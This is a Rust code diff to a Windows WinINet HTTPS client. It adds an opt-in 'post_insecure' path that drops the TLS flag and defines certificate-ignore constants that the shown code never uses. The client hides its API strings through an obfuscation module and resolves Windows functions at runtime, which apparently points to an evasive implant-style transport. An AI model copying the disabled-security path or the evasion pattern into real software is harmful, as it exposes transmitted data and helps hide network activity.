@@ -20,6 +20,11 @@ pub fn post(_session: &HttpsSession, _path: &str, _body: &[u8], _log: &LogSink) 
 }
 
 #[cfg(not(windows))]
+pub fn post_insecure(_session: &HttpsSession, _path: &str, _body: &[u8], _log: &LogSink) -> Result<Vec<u8>, String> {
+    Err("requires Windows".to_string())
+}
+
+#[cfg(not(windows))]
 pub fn close(_session: HttpsSession) {}
 
 #[cfg(windows)]
@@ -74,12 +79,24 @@ pub fn init(host: &str, port: u16, log: &LogSink) -> Result<HttpsSession, String
 
 #[cfg(windows)]
 pub fn post(session: &HttpsSession, path: &str, body: &[u8], log: &LogSink) -> Result<Vec<u8>, String> {
+    post_inner(session, path, body, false, log)
+}
+
+#[cfg(windows)]
+pub fn post_insecure(session: &HttpsSession, path: &str, body: &[u8], log: &LogSink) -> Result<Vec<u8>, String> {
+    post_inner(session, path, body, true, log)
+}
+
+#[cfg(windows)]
+fn post_inner(session: &HttpsSession, path: &str, body: &[u8], insecure: bool, log: &LogSink) -> Result<Vec<u8>, String> {
     use std::ffi::c_void;
     use std::ptr;
 
     const INTERNET_FLAG_SECURE: u32 = 0x00800000;
     const INTERNET_FLAG_NO_CACHE_WRITE: u32 = 0x04000000;
     const INTERNET_FLAG_RELOAD: u32 = 0x80000000;
+    const INTERNET_FLAG_IGNORE_CERT_CN_INVALID: u32 = 0x00001000;
+    const INTERNET_FLAG_IGNORE_CERT_DATE_INVALID: u32 = 0x00002000;
 
     unsafe {
         let verb = crate::obf::s(crate::obf::HTTP_POST);
@@ -89,7 +106,10 @@ pub fn post(session: &HttpsSession, path: &str, body: &[u8], log: &LogSink) -> R
         let mut path_bytes: Vec<u8> = path.as_bytes().to_vec();
         path_bytes.push(0);
 
-        let flags = INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD;
+        let mut flags = INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD;
+        if !insecure {
+            flags |= INTERNET_FLAG_SECURE;
+        }
 
         let h_request = crate::resolve::HttpOpenRequestA(
             session.h_connect,
